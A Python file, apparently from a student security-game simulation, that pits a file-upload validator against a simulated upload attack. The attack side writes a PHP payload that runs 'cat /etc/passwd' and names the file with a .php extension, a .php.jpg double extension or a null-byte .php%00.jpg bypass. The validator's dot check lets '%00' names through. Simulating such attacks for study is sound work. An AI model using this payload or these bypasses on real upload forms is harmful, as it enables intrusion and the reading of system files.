import exiftool
import os

def defend_injection(filename, strength):
    if not os.path.isfile(filename):
        return False
    else:
        if strength >= 0:
            valid_extensions = ['jpg', 'jpeg', 'png']
            extension = filename.split('.')[-1]
            if extension not in valid_extensions:
                return False
        if strength >= 1:
            if filename.count('.') > 1 and '%00' not in filename:
                return False
        if strength >= 2:
            with exiftool.ExifTool() as et:
                metadata = et.get_metadata(filename)
            if 'image' not in metadata['File:MIMEType']:
                return False
        return True

def attack_injection(output_file, strength):
    payload = """<?php
    system('pwd && cat /etc/passwd');
    ?>"""
    if strength == 0:
        output_file = output_file + ".php"
    if strength == 1:
        output_file = output_file + ".php.jpg"
    if strength == 2:
        output_file = output_file + ".php%00.jpg"
    with open(output_file, 'w') as f:
        f.write(payload)
    return output_file

def simulate_attack_injection(attack,defend,output_file = "/home/kali/Documents/projet_3A/gym-idsgame/gym_idsgame/cyber/ressources/file"):
    file = attack_injection(output_file, attack)
    return defend_injection(file,defend)